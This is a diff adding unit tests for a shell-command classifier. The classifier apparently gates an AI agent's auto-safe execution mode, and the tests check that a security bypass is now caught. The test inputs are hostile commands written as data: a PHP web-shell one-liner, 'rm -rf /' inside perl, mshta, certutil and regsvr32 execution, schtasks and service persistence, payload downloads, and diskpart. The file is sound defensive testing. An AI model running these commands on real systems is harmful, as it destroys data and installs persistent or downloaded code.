@@ -198,6 +198,68 @@ describe('classifyCommand', () => {
     })
   })
 
+  describe('confirm SEC-9 绕过特征（此前在 auto-safe 下会被判 allow）', () => {
+    it('解释器一行式 → DANGEROUS_INTERPRETER_INLINE', () => {
+      for (const cmd of [
+        'python -c "import os"',
+        'py -m http.server',
+        'node -e "process.exit(1)"',
+        'deno eval "fetch(url)"',
+        "perl -e 'print 1'",
+        'php -r "system($_GET[0]);"',
+        'powershell -c "Get-Process | Select-Object -First 1"'
+      ]) {
+        const r = classifyCommand(cmd, WS)
+        expect(r.reason, cmd).toBe('DANGEROUS_INTERPRETER_INLINE')
+      }
+    })
+
+    it('多重命中时按声明顺序取 reason，但判定必为 confirm（不因先匹配而放行）', () => {
+      // perl -e 里含 rm -rf：先命中 DANGEROUS_DELETE，仍要求人工确认
+      expect(classifyCommand("perl -e 'system(q{rm -rf /})'", WS)).toEqual({
+        decision: 'confirm',
+        reason: 'DANGEROUS_DELETE'
+      })
+    })
+
+    it('Windows 执行宿主 → DANGEROUS_EXEC_HOST', () => {
+      for (const cmd of ['mshta http://x/a.hta', 'rundll32 shell32.dll,Open', 'certutil -decode b64 exe', 'regsvr32 /s script.sct']) {
+        expect(classifyCommand(cmd, WS).reason, cmd).toBe('DANGEROUS_EXEC_HOST')
+      }
+    })
+
+    it('间接建进程 / 持久化 → DANGEROUS_PERSISTENCE', () => {
+      for (const cmd of [
+        'schtasks /create /tn x /tr calc',
+        'wmic process call create calc',
+        'sc create evil binPath= x',
+        'powershell Start-Process calc'
+      ]) {
+        expect(classifyCommand(cmd, WS).reason, cmd).toBe('DANGEROUS_PERSISTENCE')
+      }
+    })
+
+    it('下载落盘 → DANGEROUS_DOWNLOAD_WRITE', () => {
+      expect(classifyCommand('curl -o payload.exe http://x', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
+      expect(classifyCommand('wget --output-document a.sh http://x', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
+      expect(classifyCommand('iwr http://x -outfile a.ps1', WS).reason).toBe('DANGEROUS_DOWNLOAD_WRITE')
+    })
+
+    it('deny 优先级仍最高：解释器一行式里的毁灭命令走黑名单', () => {
+      expect(classifyCommand('python -c "import shutil"', WS).decision).toBe('confirm')
+      expect(classifyCommand('node -e "x" && diskpart', WS)).toEqual({
+        decision: 'deny',
+        reason: 'BLOCKED_DISKPART'
+      })
+    })
+
+    it('普通脚本运行与常用命令不误伤（仍是 allow）', () => {
+      for (const cmd of ['node server.js', 'python build.py', 'npm run build', 'git status', 'ls -la', 'node --version']) {
+        expect(classifyCommand(cmd, WS).decision, cmd).toBe('allow')
+      }
+    })
+  })
+
   describe('allow 安全命令', () => {
     it('ls → allow', () => {
       expect(classifyCommand('ls -la', WS).decision).toBe('allow')
